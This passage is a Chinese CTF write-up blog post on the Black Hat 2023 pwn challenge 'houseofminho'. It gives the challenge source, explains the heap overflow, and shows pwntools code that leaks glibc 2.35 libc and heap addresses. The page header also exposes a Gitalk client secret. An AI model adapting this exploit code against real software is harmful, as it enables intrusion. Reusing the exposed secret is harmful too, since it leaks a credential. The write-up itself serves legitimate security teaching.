<!DOCTYPE html><html lang="zh-CN" theme="light"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Csome"><title>[Black Hat 2023] Pwn Houseofminho Csome writeup · Csome</title><meta name="description" content="前言这个是2023 black hat第二天的一道0解pwn题
https://gitee.com/csomebro/ctftask/blob/master/2023-11_BlackHat/houseofminho.zip
题目出题人很友好的给了源码
12345678910111213141516"><meta name="keywords" content="Blog,博客,Hexo,Csome,CSOME"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta id="site_data_static" data-url="/"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/js_complied/bundle.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&amp;display=swap" rel="stylesheet"><script src="/js_complied/bundle.js"></script><script>Anatolo.comment.setConfig({"valine":{"enable":false,"appid":null,"appkey":null,"notify":false,"verify":false,"avatar":"mm","placeholder":"hello, world"},"gitment":{"enable":false,"owner":"Your GitHub ID","repo":"Repo to store comments","client_id":"Your client ID","client_secret":"Your client secret"},"gitalk":{"enable":true,"owner":"csomepro","repo":"blogComment","client_id":"7d6a77c3aaf8c1731f93","client_secret":"bdcc0b620d6bc922d81a3f92d3ecf0ecb1c8feee"},"duoshuo":null,"disqus":null,"gentie":null})</script><link rel="stylesheet" href="/css/comments/gittalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><meta name="generator" content="Hexo 8.1.0"></head><body> <main-outlet><div class="page-top animated"><div class="nav"><li><a href="/">首页</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">标签</a></li><li><a href="/about">关于</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li class="btn-toggle-more"><i class="fa fa-ellipsis"></i></li><li class="btn-go-back"><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li class="btn-search"><a class="fa fa-search" onclick="Anatolo.search.openWindow();"></a></li><li class="btn-toggle-theme"><a class="far fa-sun" onclick="Anatolo.darkLightToggle();"></a></li></div><div class="avatar"><img src="/images/Csome2.webp"></div></div></div><div class="toc-mobile"><div class="toc-button"><span>目录</span></div><div class="toc-container in-page animated fadeInDown"><div class="toclist-container"><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">前言</span></a></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E9%A2%98%E7%9B%AE"><span class="toclist-text">题目</span></a></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toclist-text">漏洞</span></a></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toclist-text">信息收集</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%B3%84%E9%9C%B2Libc%E5%9C%B0%E5%9D%80"><span class="toclist-text">泄露Libc地址</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%B3%84%E9%9C%B2heap%E5%9C%B0%E5%9D%80"><span class="toclist-text">泄露heap地址</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E5%88%A9%E7%94%A8%E6%94%BB%E5%87%BB"><span class="toclist-text">利用攻击</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Small-bin-Tcache-bin"><span class="toclist-text">Small bin -&gt; Tcache bin</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BC%AA%E9%80%A0Small-bin%EF%BC%880x90%EF%BC%89%E5%8F%AF%E8%A1%8C%E6%80%A7%E8%AE%A8%E8%AE%BA"><span class="toclist-text">伪造Small bin（0x90）可行性讨论</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Unlink%E6%89%A9%E5%B1%95%E6%BA%A2%E5%87%BA%E8%B7%9D%E7%A6%BB"><span class="toclist-text">Unlink扩展溢出距离</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BC%AA%E9%80%A0Unsorted-bin"><span class="toclist-text">伪造Unsorted bin</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Unlink%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8ASmallbin%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB%E5%AE%9E%E6%96%BD"><span class="toclist-text">Unlink攻击以及Smallbin伪造攻击实施</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BF%AE%E6%94%B9Small-bin"><span class="toclist-text">修改Small bin</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#House-of-Apple-2"><span class="toclist-text">House of Apple 2</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E5%AE%8C%E6%95%B4Exp"><span class="toclist-text">完整Exp</span></a></li></ol></div></div></div></div><div class="sidebar animated"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/Csome2.webp" style="width:200px;" alt="favicon"><h3 title=""><a href="/">Csome</a></h3><div class="description"><p>「算法」✔「CTF」✔「编曲」✔「唱歌」×</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/CsomePro"><i class="fab fa-github"></i></a></li><li><a href="mailto:csome@m.scnu.edu.cn"><i class="fa fa-envelope"></i></a></li></ul></div><div class="toc-container in-sidebar animated fadeInDown"><details class="ltr" open><summary>目录</summary><div class="toclist-container"><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">前言</span></a></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E9%A2%98%E7%9B%AE"><span class="toclist-text">题目</span></a></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toclist-text">漏洞</span></a></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toclist-text">信息收集</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%B3%84%E9%9C%B2Libc%E5%9C%B0%E5%9D%80"><span class="toclist-text">泄露Libc地址</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E6%B3%84%E9%9C%B2heap%E5%9C%B0%E5%9D%80"><span class="toclist-text">泄露heap地址</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E5%88%A9%E7%94%A8%E6%94%BB%E5%87%BB"><span class="toclist-text">利用攻击</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Small-bin-Tcache-bin"><span class="toclist-text">Small bin -&gt; Tcache bin</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BC%AA%E9%80%A0Small-bin%EF%BC%880x90%EF%BC%89%E5%8F%AF%E8%A1%8C%E6%80%A7%E8%AE%A8%E8%AE%BA"><span class="toclist-text">伪造Small bin（0x90）可行性讨论</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Unlink%E6%89%A9%E5%B1%95%E6%BA%A2%E5%87%BA%E8%B7%9D%E7%A6%BB"><span class="toclist-text">Unlink扩展溢出距离</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BC%AA%E9%80%A0Unsorted-bin"><span class="toclist-text">伪造Unsorted bin</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Unlink%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8ASmallbin%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB%E5%AE%9E%E6%96%BD"><span class="toclist-text">Unlink攻击以及Smallbin伪造攻击实施</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E4%BF%AE%E6%94%B9Small-bin"><span class="toclist-text">修改Small bin</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#House-of-Apple-2"><span class="toclist-text">House of Apple 2</span></a></li></ol></li><li class="toclist-item toclist-level-1"><a class="toclist-link" href="#%E5%AE%8C%E6%95%B4Exp"><span class="toclist-text">完整Exp</span></a></li></ol></div></div></details></div></div><div class="footer"><div class="p"><span>全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Csome</span></div><div class="by_farbox"><span>Powered by</span><a href="https://hexo.io/zh-cn/" target="_blank"> Hexo</a><span> &</span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank"> Anatolo</a></div><div class="beian"></div></div></div><div class="main animated fadeInDown"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated"><div class="post-title"><h3><a>[Black Hat 2023] Pwn Houseofminho Csome writeup</a></h3></div><div class="post-content"><p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个是2023 black hat第二天的一道0解pwn题</p>
<p><a target="_blank" rel="noopener" href="https://gitee.com/csomebro/ctftask/blob/master/2023-11_BlackHat/houseofminho.zip">https://gitee.com/csomebro/ctftask/blob/master/2023-11_BlackHat/houseofminho.zip</a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>出题人很友好的给了源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SMALL 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BIG   0x80</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *g_buf;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getint</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> val;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d%*c&quot;</span>, &amp;val) != <span class="number">1</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. new\n2. show\n3. delete&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> (getint(<span class="string">&quot;&gt; &quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: &#123; <span class="comment">/* new */</span></span><br><span class="line">        <span class="keyword">if</span> (g_buf) &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[-] Buffer in use&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getint(<span class="string">&quot;Size [1=small / 2=big]: &quot;</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">          g_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(SIZE_SMALL);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          g_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(SIZE_BIG);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">        read(STDIN_FILENO, g_buf, SIZE_BIG);</span><br><span class="line">        g_buf[<span class="built_in">strcspn</span>(g_buf, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: &#123; <span class="comment">/* show */</span></span><br><span class="line">        <span class="keyword">if</span> (!g_buf) &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[-] Empty buffer&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Data: %s\n&quot;</span>, g_buf);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: &#123; <span class="comment">/* delete */</span></span><br><span class="line">        <span class="keyword">if</span> (!g_buf) &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;[-] Empty buffer&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">free</span>(g_buf);</span><br><span class="line">          g_buf = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Bye!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题面十分的简短，主要实现了三个功能，分别为</p>
<ol>
<li>add功能，可以申请<code>malloc(0x80)</code>以及<code>malloc(0x40)</code>，无论申请哪一个，都会<code>read(0, g_buf, 0x80)</code></li>
<li>show功能，直接打印<code>g_buf</code></li>
<li>free功能，<code>free(g_buf)</code>之后，清空<code>g_buf</code></li>
</ol>
<p>Glibc 版本 为2.35-3.1</p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>显而易见，漏洞就在add功能中<code>read(0, g_buf, 0x80)</code>，但是局限十分多</p>
<ol>
<li>申请堆块的大小被严格限制，只有0x40和0x80两种申请</li>
<li>可以保存的堆块仅仅只有一块，也就是如果需要再次malloc，必须先free</li>
</ol>
<p>那么会带来什么问题呢？</p>
<p>首先glibc 2.35已经限制了tcache bin内的chunk不能多malloc一次，也就是如果对应位置的count为0，就不会申请出来，这就否定了直接溢出修改fd导致任意地址申请的方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = malloc(0x40)</span><br><span class="line">free(p)</span><br><span class="line">p = malloc(0x80)</span><br><span class="line">free(p)</span><br><span class="line">p = malloc(0x40) // 重新申请回上述的0x40块</span><br><span class="line">read(0, p, 0x80) // 溢出写入到下方的0x80块的fd，并修改size改小</span><br><span class="line">free(p)</span><br><span class="line">p = malloc(0x80)</span><br><span class="line">free(p) // 由于上文改小了size，那么这里释放的时候就不会进入0x90的管理</span><br><span class="line">p = malloc(0x80) // 此时再次申请，如果低版本的tcache就可以申请出任意地址，但是2.35不行</span><br></pre></td></tr></table></figure>

<p>**上述的做法是行不通的！**上述操作之后，0x90管理的位置count已经为0了，所以下次malloc(0x80)就不会从0x90的tcache取出，无法达成任意地址申请</p>
<p><img src="/p/houseofminho-wp/image-20231117232223970.png" alt="image-20231117232223970"></p>
<p>但是上述做法给了一个思路，我们可以通过多次free再次malloc 0x40就可以申请回来第一个堆块，并写入0x80长度，这个溢出很稳定，以及我们可以修改下一个堆块大小，使得绕过tcache多次申请0x90的堆块，那么现在我们需要修改tcachebin管理0x90的count值，使得可以任意地址申请。但是这个很难做到，怎么做呢？请读者继续往下看。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>如何泄露libc？如何泄露堆地址？</p>
<h2 id="泄露Libc地址"><a href="#泄露Libc地址" class="headerlink" title="泄露Libc地址"></a>泄露Libc地址</h2><p>首先我们需要使用House of orange的一个技巧，将Top Chunk的size改小，然后申请一个大的堆块就可以把，Top Chunk放入Unsorted bin内，之后利用溢出覆盖size就可以泄露libc地址了。</p>
<p>但是这里有一个极大的问题！Top chunk需要对其0x1000，但是已有的堆+0x40或者0x80都不可能对齐0x1000，怎么办？</p>
<p>这里需要提到在没有setbuf(stdin,0);的情况下，scanf的输入长文本，回调用malloc、realloc、free，其中如果scanf输入数据大小为0x1000，那么会产生一下调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0x800</span>);</span><br><span class="line">p = <span class="built_in">realloc</span>(p, <span class="number">0x1000</span>);</span><br><span class="line">p = <span class="built_in">realloc</span>(p, <span class="number">0x2000</span>);</span><br><span class="line"><span class="built_in">free</span>(p)</span><br></pre></td></tr></table></figure>

<p>那么我们就可以完成Top Chunk的攻击了，以下是泄露libc的exp，并修复损坏的size</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xd11</span>))</span><br><span class="line">show2(<span class="number">0x1000</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base : <span class="subst">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xcf1</span>))</span><br></pre></td></tr></table></figure>

<p>此时堆块的布局如下</p>
<p><img src="/p/houseofminho-wp/image-20231118000114704.png" alt="image-20231118000114704"></p>
<p>为何下方有0x10的两个块呢？那就需要了解一下unsortedbin的检查</p>
<p>在<code>_int_malloc</code>中有这么一串代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>总结一下就是</p>
<ol>
<li>检查当前unsorted bin内的块<code>size</code>位是不是合法的，是否满足<code>0x10 &lt;= size &lt;= system_mem</code></li>
<li>检查当前块下物理地址相邻的下一块<code>size</code>是不是合法的，是否满足<code>0x10 &lt;= size &lt;= system_mem</code></li>
<li>检查物理地址相邻的下一块<code>size</code>的<code>prev_size</code>是否和自己的<code>size</code>相等</li>
<li>检查当前指针的<code>bck-&gt;fd</code>是否等于自己，以及自己的<code>fd</code>是否是<code>main_arena</code>内的一个特定地址</li>
<li>最后检查物理地址相邻的下一块的<code>prev_inuse</code>是不是<code>0</code></li>
</ol>
<p>那么如果正常逻辑下Top Chunk被free到unsorted bin，说明当前内存应该全部分配完了，如果原封不动直接放到unsorted bin内，就会触发上述第2、3、5的检查不合法或者溢出，所以为了防止这个事情发生，就需要在下方设置两个小哨兵块，A块的作用是满足上述第2、3、5的检查，设置prev_size等关键数据，而<strong>B块的作用是防止A块发生unlink合并</strong>，B块的<code>prev_inuse</code>标志是1，代表A块是使用中，所以不会发生unlink，否则unlink会报错（试想一下，如果没有B块，那么A块没有被使用的，如果申请一个刚好大小为当前unsortbin的块，再释放，那么就会触发向前合并unlink，之后由于A块的fd和bk指针问题，导致程序crash）</p>
<p><img src="/p/houseofminho-wp/image-20231118001409448.png" alt="image-20231118001409448"></p>
<p>到这里，我们压一下脑栈，上述的unsorted bin布局，后文会使用到，我们回到泄露上</p>
<h2 id="泄露heap地址"><a href="#泄露heap地址" class="headerlink" title="泄露heap地址"></a>泄露heap地址</h2><p>泄露heap地址相对简单，直接free当前堆块后，由于tcache bin的fd指针具有<code>REVEAL_PTR</code>的保护，所以Tcache bin的第一块由于fd是0，但是被加密之后会变成<code>0 ^ (heap_adde &gt;&gt; 12)</code>的值，故可以直接泄露堆地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<p>泄露并修复的exp如下（当前exp衔接泄露libc的）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">... </span><span class="comment"># 衔接上文泄露libc</span></span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">heap_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_base : <span class="subst">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 一下两行仅仅作为临时修复，使得堆布局好看一点，正式攻击可以删除</span></span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br></pre></td></tr></table></figure>

<p>此时heap地址、Libc地址信息已经收集完毕！我们来看看现在堆长什么样子</p>
<p><img src="/p/houseofminho-wp/image-20231118002652903.png" alt="image-20231118002652903"></p>
<p>当前我们可控的堆块已经标注在图中，为啥叫做可控呢？因为由于tcache的原因，以及我们只能拥有一个堆块，所以free malloc交替进行我们只能控制这两个区域内存（？这两个区域内存我们应该如何做文章呢？请读者压一压脑栈继续往下看。）</p>
<p><img src="/p/houseofminho-wp/image-20231118002710057.png" alt="image-20231118002710057"></p>
<h1 id="利用攻击"><a href="#利用攻击" class="headerlink" title="利用攻击"></a>利用攻击</h1><p>信息收集终于结束了，堆也变成了不认识的样子，那么我们攻击的入口在哪里呢？</p>
<h2 id="Small-bin-Tcache-bin"><a href="#Small-bin-Tcache-bin" class="headerlink" title="Small bin -&gt; Tcache bin"></a>Small bin -&gt; Tcache bin</h2><p>答案是<code>Small bin</code>！</p>
<p>为何选用Small bin呢？阅读源码我们可以知道，Small bin是有机会进入Tcache的，什么时机进入呢？在malloc中如果命中了Small bin某个大小的管理，那么就会将这个大小内的剩下所有块依次取出，放入Tcache内，直至填满Tcache</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 